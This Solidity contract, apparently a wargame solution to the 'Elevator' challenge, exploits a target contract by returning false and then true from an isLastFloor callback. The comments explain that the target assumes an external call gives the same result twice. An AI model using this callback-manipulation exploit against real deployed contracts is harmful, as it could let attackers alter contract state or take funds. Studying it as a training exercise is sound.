//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "./Elevator.sol";

interface IElevator{
function goTo(uint256) external;
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract GXT is Building{
IElevator elevator;
//counter used to return different values in isLastFloor()
uint counter=0;

constructor(address _a) {
    elevator = IElevator(_a);
}

function attack() public {
   // here I call the target contract's vulnerable function
   //the value is not important, any value will work 
    elevator.goTo(657);
}

function isLastFloor(uint f) external override returns(bool rez){
   
    rez= counter == 0 ? false : true;
    if(!rez) counter = 1; 

    //the function returns false the first time and increments the counter => the if() will be entered in the Elevator contract
    //the second time because of the incremented counter the function will return true =>bool top value will be set on true)

    //the problem with the goTo() function is that it calls the same function twice, in two different 
    //segments of the code and assumes the result will be the same when the same input is passed
    //this is unsafe because the return can be manipulated, even with the same passed arg
}
}
